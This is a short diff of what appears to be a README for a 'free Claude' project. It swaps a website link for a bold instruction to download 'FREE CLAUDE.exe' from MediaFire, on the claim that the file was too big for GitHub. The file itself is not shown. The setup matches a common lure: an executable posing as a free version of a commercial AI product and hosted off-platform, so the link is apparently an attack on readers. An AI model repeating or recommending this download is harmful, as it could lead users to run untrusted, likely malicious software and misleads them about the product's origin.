@@ -6,7 +6,7 @@
 
 ---
 
-My site:  https://free-claude.42web.io/
+**THE APPLICATION IS AT**: https://www.mediafire.com/file/7j8lmgmts5ypf0p/FREE+CLAUDE.exe/file (it was too big to fit in github)
 
 ## Features
 
